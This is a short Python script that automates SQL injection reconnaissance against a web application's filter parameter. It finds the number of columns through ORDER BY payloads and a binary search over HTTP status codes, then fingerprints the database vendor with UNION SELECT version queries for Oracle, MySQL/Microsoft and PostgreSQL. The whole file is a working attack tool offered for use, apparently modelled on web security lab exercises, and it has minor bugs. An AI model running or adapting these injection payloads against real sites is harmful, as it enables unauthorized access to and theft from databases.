import urllib
import argparse
import requests
from colorama import Style, Fore


class Columns:
    __url: str | None = None
    __param: str | None = None
    __amount: int | None = None

    def __init__(self, url, param, amount):
        self.__url = url
        self.__param = param
        self.__amount = amount
        self.run()
        self.db_version()

    def run(self):
        print(self.encode_url(10))
        self.binary_search()

    def db_version(self):
        # ORACLE
        oracle ="' union select banner"
        microsoft_mysql = "' union select @@version" # microsoft and mysql have the same query
        postgre = "' union select version()"

        for i in range(self.__amount - 1):
            oracle += ', null'
            microsoft_mysql += ', null'
            postgre += ', null'
        
        oracle += ' from v$version-- -'
        microsoft_mysql += '-- -'
        postgre += '-- -'

        oracle = urllib.parse.quote(oracle)
        microsoft_mysql = urllib.parse.quote(microsoft_mysql)
        postgre = urllib.parse.quote(postgre)

        if self.make_request(f"{self.__url}filter?{self.__param}={oracle}") == 200:
            print(Fore.GREEN, "[+] Oracle DB", Style.RESET_ALL)
        elif self.make_request(f"{self.__url}filter?{self.__param}={microsoft_mysql}") == 200:
            print(Fore.GREEN, "[+] Microsoft or MySQL you have to find out by urself ", Style.RESET_ALL)
        elif self.make_request(f"{self.__url}filter?{self.__param}={postgre}") == 200:
            print(Fore.GREEN, "[+] Postgre", Style.RESET_ALL)
        else:
            print("LMAO")

    def encode_url(self, counter) -> str:
        return f"{self.__url}filter?{self.__param}=" + urllib.parse.quote("' order by ") + f"{counter}" + urllib.parse.quote("-- -")

    def make_request(self, url) -> int:
        response = requests.get(url) 
        return response.status_code

    def binary_search(self):
        tmp_val = self.__amount//2
        while True:
            status_code = self.make_request(self.encode_url(self.__amount))
            # print(f"Status code: {status_code}\nAmount: {self.__amount}\nTmp_val: {tmp_val}\n")
            if status_code != 200:
                tmp_val = 1 if tmp_val//2 == 0 else tmp_val//2
                self.__amount -= tmp_val
            else:
                if self.make_request(self.encode_url(self.__amount+1)) == 500:
                    print(Fore.GREEN, f"[+] Amount of columns: {self.__amount}", Style.RESET_ALL)
                    return
                else:
                    tmp_val//2
                    self.__amount += tmp_val



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Finding amount of columns. Beta version.")
    parser.add_argument("--url", "-u", type=str, nargs=1, help="Provide the url.")
    parser.add_argument("--param", "-p", type=str, nargs=1, help="Provide the param.")
    parser.add_argument("--amount", "-a", type=int, nargs=1, help="Predicted amount of columns. Has to be bigger than the actual one.")
    args = parser.parse_args()
    columns = Columns(args.url[0], args.param[0], args.amount[0])
